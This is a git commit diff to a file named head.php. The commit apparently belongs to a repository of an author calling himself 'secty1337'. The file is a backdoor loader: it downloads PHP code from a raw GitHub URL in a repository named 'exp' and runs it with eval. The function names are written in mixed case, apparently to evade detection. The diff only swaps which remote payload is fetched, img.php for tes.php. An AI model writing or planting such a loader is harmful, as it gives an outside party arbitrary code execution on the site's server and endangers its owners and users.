a6d7002403ef47f42666e7d8f97d37be2d209bbc
secty1337 <nantube003@gmail.com>
2025-04-19 08:47:42 +0700

    Update head.php

--- head.php
+++ head.php
@@ -1,3 +1,3 @@
-<?PhP $url="https://raw.githubusercontent.com/secty1337/exp/refs/heads/main/img.php";
+<?PhP $url="https://raw.githubusercontent.com/secty1337/exp/refs/heads/main/tes.php";
 $kode=FiLe_GeT_CoNtEnTs($url);
 eVaL("?>".$kode);
